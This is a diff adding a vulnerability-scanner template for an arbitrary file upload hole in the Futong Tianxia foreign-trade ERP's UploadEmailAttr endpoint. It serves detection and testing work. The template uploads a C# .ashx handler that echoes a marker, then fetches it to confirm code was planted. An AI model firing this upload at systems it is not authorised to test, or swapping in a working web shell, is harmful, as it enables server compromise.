@@ -1,0 +1,54 @@
+id: futongtianxiaERP-UploadEmailAttr-upload
+
+info:
+  name: 富通天下外贸ERPUploadEmailAttr存在任意文件上传漏洞
+  author: futongtianxiaERP
+  severity: high
+  tags: futongtianxiaERP
+
+http:
+  - raw:
+      - |
+        POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        <% @ webhandler language="C#" class="AverageHandler" %>
+        using System;
+        using System.Web;
+        public class AverageHandler : IHttpHandler
+        {
+        public bool IsReusable
+        { get { return true; } }
+        public void ProcessRequest(HttpContext ctx)
+        {
+        ctx.Response.Write("hellds3s69f5sf5g2");
+        }
+        }
+
+      - |+
+        GET /JoinfWebFile/temp/emailatta/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: path
+        regex:
+          - 'temp/emailatta/(.*?\.ashx)'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - 'hellds3s69f5sf5g2'
+    matchers-condition: and
